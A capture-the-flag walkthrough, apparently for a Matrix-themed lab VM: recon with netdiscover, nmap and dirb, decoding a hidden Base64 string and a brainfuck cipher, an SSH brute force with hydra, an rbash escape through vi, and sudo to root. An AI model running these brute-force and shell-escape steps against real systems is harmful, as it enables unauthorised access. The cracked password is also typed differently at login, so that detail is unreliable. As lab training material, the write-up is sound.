@@ -1,1 +1,89 @@
+Step 1 - Get host IP address:
+> ifconfig
+IP is 192.168.56.101
+
+Step 2 - Scan network for vulnerable server IP:
+> sudo netdiscover -r 192.168.56.0/24
+Found victim IP: 192.168.56.107
+
+Step 3 - Nmap scan victim:
+> nmap -sV 192.168.56.107 -p-
+Ports 22, 80 and 31337 are open
+31337 is also a http service
+
+Step 4 - Enumerate for subdirectories:
+> dirb http://192.168.56.107 /usr/share/wordlists/dirb/common.txt
+Nothing interesting found
+
+Step 5 - Go to Port 31337 in browser:
+New website is found
+
+Step 6 - Inspect page source:
+Hidden Base64 hash found in service class
+
+Step 7 - Decode:
+> echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d 
+Result contains possible subdirectory 'Cypher.matrix'
+
+Step 8 - Add Cypher.matrix to the end of current url:
+Download file
+
+Step 9 - Open Cypher.matrix file:
+Contains a brainfuck cypher
+
+Step 10 - Decode brainfuck cypher:
+Use www.splitbrain.org
+Output: "You can enter into matrix as guest, with password k1ll0rXX
+Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password."
+
+Step 11 - Create script that generates all possible passwords
+See pass-end.py
+
+Step 12 - Save script output to text file and use this as the password list to bruteforce:
+> python3 pass-end.py > plist.txt
+> hydra -l guest -P plist.txt 192.168.56.107 ssh -V
+
+Step 13 - Retrieve password match:
+Password is k1ll0r7n
+
+Step 14 - Login with ssh:
+> ssh guest@192.168.56.107
+> Password: k11l0r7n
+Shell is restricted with rbash
+
+Step 15 - Use vim to enter bash shell:
+> vi
+> :!/bin/bash
+Bash shell entered
+
+Step 16 - Check sudo capabilities, then export to shell and path to use environment properly:
+> sudo -l
+Command not found
+> export SHELL=/bin/bash:$SHELL
+> export PATH=/usr/bin:$PATH
+
+Step 17 - Recheck sudo capabilities and export bin directory to path environment:
+> sudo -l
+Capabilities now listed
+> sudo su
+Command still not found
+> export PATH=/bin:$PATH
+> sudo su
+Root access now gained
+
+Step 18 - Read flag.txt
+> cd root
+> ls
+Contains flag.txt
+> cat flag.txt
+Read output 
+
+
+
+
+
+
+
+
+
 
